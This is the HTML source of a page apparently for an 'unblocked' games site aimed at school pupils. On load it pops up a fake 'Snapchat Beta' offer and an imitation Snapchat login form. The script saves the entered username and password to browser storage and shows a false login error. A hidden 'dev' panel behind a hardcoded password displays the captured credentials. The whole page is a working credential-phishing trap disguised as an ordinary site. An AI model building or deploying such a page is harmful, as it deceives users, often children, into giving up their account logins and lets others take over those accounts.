<!DOCTYPE html>
<html>
<head>
  <title>Home | WWO Unblocked</title>
  <link rel="stylesheet" href="style.css">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
    }

    #main-content {
      display: none;
      padding: 20px;
    }

    .popup {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0, 0, 0, 0.7);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    .popup-content {
      background: white;
      padding: 20px;
      text-align: center;
      border-radius: 10px;
      max-width: 400px;
    }

    .flash-red {
      color: red;
      font-weight: bold;
      animation: flash 1s infinite;
    }

    @keyframes flash {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }

    #snapchat-login {
      display: none;
      background: yellow;
      height: 100vh;
      text-align: center;
      padding-top: 100px;
    }

    input {
      padding: 10px;
      margin: 5px;
      font-size: 16px;
    }

    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-top: 10px;
    }

    #dev-page {
      display: none;
      background: black;
      color: lime;
      height: 100vh;
      padding: 20px;
    }
  </style>
</head>

<body>

<!-- Snapchat Beta Popup -->
<div class="popup" id="snapchat-popup">
  <div class="popup-content">
    <div class="flash-red">
      Would you like to try our new Snapchat Beta 1.0? Text mates in school and just have fun!
    </div>
    <button onclick="startSnapchat()">Yes</button>
    <button onclick="closeSnapchatPopup()">No</button>
  </div>
</div>

<!-- Snapchat Login -->
<div id="snapchat-login">
  <h2>Login to Snapchat</h2>
  <input type="text" id="snap-username" placeholder="Username"><br>
  <input type="password" id="snap-password" placeholder="Password"><br>
  <button onclick="submitSnapchat()">Login</button>
</div>

<!-- Dev Check Popup -->
<div class="popup" id="dev-popup" style="display: none;">
  <div class="popup-content">
    <p>Are you a dev?</p>
    <button onclick="handleDevYes()">Yes</button>
    <button onclick="closeDevPopup()">No</button>
  </div>
</div>

<!-- Dev Password Prompt -->
<div class="popup" id="dev-pass-popup" style="display: none;">
  <div class="popup-content">
    <p>Enter Dev Password</p>
    <input type="password" id="dev-password"><br>
    <button onclick="checkDevPass()">Submit</button>
  </div>
</div>

<!-- Dev Page -->
<div id="dev-page">
  <h2>User Info</h2>
  <p><b>Snapchat Username:</b> <span id="saved-username"></span></p>
  <p><b>Snapchat Password:</b> <span id="saved-password"></span></p>
</div>

<!-- Main Content -->
<div id="main-content">
  <h1>Welcome to WWO Unblocked</h1>
  <p>Explore the Unblocked Universe with WWO Unblocked!</p>
</div>

<script>
  // Show dev popup after Snapchat popup closes
  function closeSnapchatPopup() {
    document.getElementById("snapchat-popup").style.display = "none";
    document.getElementById("dev-popup").style.display = "flex";
  }

  function startSnapchat() {
    document.getElementById("snapchat-popup").style.display = "none";
    document.getElementById("snapchat-login").style.display = "block";
  }

  function submitSnapchat() {
    const user = document.getElementById("snap-username").value;
    const pass = document.getElementById("snap-password").value;

    if (!user || !pass) {
      alert("Please fill in both fields.");
      return;
    }

    // Save for dev page
    localStorage.setItem("snap_user", user);
    localStorage.setItem("snap_pass", pass);

    alert("Error logging in.");
    document.getElementById("snapchat-login").style.display = "none";
    document.getElementById("main-content").style.display = "block";
    document.getElementById("dev-popup").style.display = "flex";
  }

  function closeDevPopup() {
    document.getElementById("dev-popup").style.display = "none";
  }

  function handleDevYes() {
    document.getElementById("dev-popup").style.display = "none";
    document.getElementById("dev-pass-popup").style.display = "flex";
  }

  function checkDevPass() {
    const pass = document.getElementById("dev-password").value;
    if (pass === "will!") {
      document.getElementById("dev-pass-popup").style.display = "none";
      document.getElementById("dev-page").style.display = "block";
      document.getElementById("saved-username").innerText = localStorage.getItem("snap_user") || "None";
      document.getElementById("saved-password").innerText = localStorage.getItem("snap_pass") || "None";
    } else {
      alert("Wrong password.");
    }
  }

  // Optional: auto-show popup after page load
  window.onload = () => {
    document.getElementById("snapchat-popup").style.display = "flex";
  };
</script>

</body>
</html>
